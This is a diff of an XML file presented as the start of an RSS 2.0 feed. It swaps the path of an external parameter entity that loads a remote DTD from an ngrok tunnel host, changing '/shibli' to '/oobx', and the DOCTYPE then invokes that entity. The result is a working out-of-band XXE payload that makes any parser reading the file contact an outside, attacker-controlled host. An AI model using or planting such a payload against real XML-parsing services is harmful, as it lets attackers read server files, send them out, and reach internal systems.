@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [
-<!ENTITY % ext SYSTEM "https://8898-2405-201-684a-3810-e0b8-3e7b-1e43-b370.ngrok-free.app/shibli"> %ext;
+<!ENTITY % ext SYSTEM "https://8898-2405-201-684a-3810-e0b8-3e7b-1e43-b370.ngrok-free.app/oobx"> %ext;
 ]>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
